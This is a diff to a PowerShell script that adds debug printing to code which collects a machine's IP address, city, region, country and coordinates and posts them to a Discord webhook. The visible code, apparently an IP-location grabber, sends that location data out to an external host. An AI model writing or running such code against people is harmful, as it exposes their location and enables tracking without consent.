@@ -13,8 +13,16 @@ if ($locationData) {
     $country = $locationData.country
     $coordinates = $locationData.loc
 
+    # Debugging outputs
+    Write-Host "IP: $ip"
+    Write-Host "City: $city"
+    Write-Host "Region: $region"
+    Write-Host "Country: $country"
+    Write-Host "Coordinates: $coordinates"
+
     # Format the message
     $message = "IP: $ip`nCity: $city`nRegion: $region`nCountry: $country`nCoordinates: $coordinates"
+    Write-Host "Message Content: $message"
 
     # Send the message to the Discord webhook
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message} | ConvertTo-Json -Depth 1)
